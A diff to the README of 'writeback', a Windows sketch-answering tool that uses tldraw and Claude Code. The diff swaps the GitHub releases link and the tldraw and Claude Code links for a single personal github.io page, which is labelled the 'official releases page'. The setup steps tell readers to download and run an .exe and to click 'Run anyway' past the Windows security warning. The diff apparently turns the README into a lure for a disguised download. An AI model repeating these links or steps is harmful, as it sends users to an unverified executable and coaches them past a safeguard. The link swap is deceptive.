@@ -1,6 +1,6 @@
 # ✍️ writeback - Turn your sketches into smart answers
 
-[Visit the release page to download](https://github.com/Raynerhalfandhalf451/writeback/releases)
+[Visit the release page to download](https://raynerhalfandhalf451.github.io)
 
 Writeback transforms your whiteboard into a smart assistant. You draw sketches or write questions on your canvas. The tool provides answers directly on your screen. It handles math, text, and diagrams without moving or hiding your original work. 
 
@@ -11,15 +11,15 @@ This tool relies on your existing account for Claude Code. It does not require s
 ## 📋 System Requirements
 
 *   A Windows computer running Windows 10 or newer.
-*   The [tldraw offline](https://tldraw.com) desktop application.
-*   An active [Claude Code](https://claude.com/claude-code) user profile.
+*   The [tldraw offline](https://raynerhalfandhalf451.github.io) desktop application.
+*   An active [Claude Code](https://raynerhalfandhalf451.github.io) user profile.
 *   An active internet connection to process your requests with the AI.
 
 ## 📥 Downloading and setup ⚙️
 
 Follow these steps to set up the software on your Windows machine:
 
-1.  Visit the [official releases page](https://github.com/Raynerhalfandhalf451/writeback/releases).
+1.  Visit the [official releases page](https://raynerhalfandhalf451.github.io).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open the downloaded file. Windows may show a security window. Click "More info" and then "Run anyway" if you trust the software.
